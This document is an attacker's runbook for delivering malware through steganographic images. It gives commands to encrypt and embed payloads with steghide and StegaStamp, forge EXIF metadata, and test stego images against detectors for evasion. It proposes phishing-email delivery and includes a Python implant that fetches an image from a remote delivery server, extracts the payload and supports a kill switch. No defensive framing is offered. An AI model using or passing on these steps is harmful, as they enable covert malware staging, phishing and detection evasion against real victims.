# Runbook: payload delivery via steganographic images

Delivering a secondary payload through an image file that looks completely innocuous.
The target downloads or receives the image through a normal channel (email attachment,
web page, file share) and an agent on the target host extracts and executes the payload.

## Prepare the payload

Encrypt before embedding. The embedding protects against casual detection; the encryption
protects against forensic recovery if the embedding is found.

```text
openssl enc -aes-256-cbc -pbkdf2 -in payload.bin -out payload.enc -k 'delivery_key_2024'
```

For small payloads (shellcode, a URL, a decryption key for a separately hosted stage):
encode as a hex or base64 string for embedding.

For larger payloads: consider two-stage delivery. Embed a URL pointing to the next stage
rather than the payload itself. The image carries only the URL; the actual payload is
fetched on demand. This keeps the embedding density low, which reduces detection risk.

## Select and prepare the cover image

Cover image choice matters for detection resistance. High-texture images (outdoor
photographs, fabric, foliage) conceal LSB and neural embedding better than smooth images.
Avoid synthetic images, illustrations, or images with large uniform colour regions.

Verify the image is not already in use or known; embedding into a widely shared stock
photo that another analyst has already analysed is a risk. Use a fresh photograph.

Strip existing metadata before embedding:

```text
exiftool -all= cover.jpg
```

Rewrite with neutral metadata if needed:

```text
exiftool -Make="Canon" -Model="Canon EOS 250D" -DateTimeOriginal="2024:08:15 11:32:00" cover.jpg
```

## Embed: classical method (steghide)

steghide works with JPEG, BMP, WAV, and AU. For image delivery, JPEG is typical.

```text
steghide embed -cf cover.jpg -sf payload.enc -p 'delivery_key_2024' -z 9 -e rijndael-256
```

`-z 9` sets maximum compression; `-e rijndael-256` adds steghide's own encryption layer on
top of the already-encrypted payload (belt and braces).

Verify the embedding by extracting immediately:

```text
steghide extract -sf cover.jpg -p 'delivery_key_2024' -xf extracted.enc
diff payload.enc extracted.enc && echo "OK"
```

Check that the stego image looks visually normal:

```text
compare -metric PSNR cover.jpg cover.jpg[steghide_output] diff.png
```

PSNR above 38dB is typically imperceptible. steghide at default capacity is well above this.

## Embed: neural method (StegaStamp)

For higher detection resistance against ML classifiers:

```text
git clone https://github.com/tancik/StegaStamp && cd StegaStamp
pip install -r requirements.txt

# convert payload.enc to 100-bit fingerprint (e.g. first 100 bits of hash)
python encode_image.py --image cover.png --secret "$(head -c 13 payload.enc | xxd -b -c 13 | awk '{for(i=2;i<=NF-1;i++) printf $i}')" --output stego.png
```

StegaStamp embeds 100 bits, which suits key or URL payloads. For larger payloads, embed
a 100-bit index into a lookup table the agent already has, or embed an AES key for a
separately staged payload.

## Deliver the image

Inline in a phishing email as an attachment or embedded image. Recipients are unlikely to
question an image embedded in what looks like a corporate newsletter.

Hosted on a web server the agent polls. The agent requests the image on a schedule, extracts
the payload, and processes it. Steganographic delivery works well as a staging mechanism
when the phishing email itself contains no executable content, only an image.

Via a file share, intranet, or document management system if the agent already has access
to the target network.

## Agent-side extraction

A minimal Python agent that retrieves and extracts a steghide payload:

```python
import subprocess, urllib.request, os, tempfile

IMG_URL   = 'https://delivery-server/image.jpg'
STEG_PASS = 'delivery_key_2024'

def fetch_and_extract():
    tmp_img = tempfile.mktemp(suffix='.jpg')
    tmp_out = tempfile.mktemp(suffix='.bin')
    urllib.request.urlretrieve(IMG_URL, tmp_img)
    ret = subprocess.run(
        ['steghide', 'extract', '-sf', tmp_img, '-p', STEG_PASS, '-xf', tmp_out, '-f'],
        capture_output=True
    )
    if ret.returncode == 0 and os.path.exists(tmp_out):
        with open(tmp_out, 'rb') as f:
            return f.read()
    return None
```

The agent checks the return code; steghide exits non-zero if extraction fails (wrong
password or no embedded data). This can be used as a signal: a clean image posted to the
delivery URL acts as a kill switch.

## Notes

Do not reuse cover images. Each embedding leaves a unique statistical signature relative to
that specific image. Reusing a cover with different payloads risks correlation if both stego
versions are captured.

Test against Aletheia before delivery:

```text
aletheia auto-test --image stego.jpg
```

A detection probability above 0.7 for any model is a signal to change the cover image or
reduce the payload density.
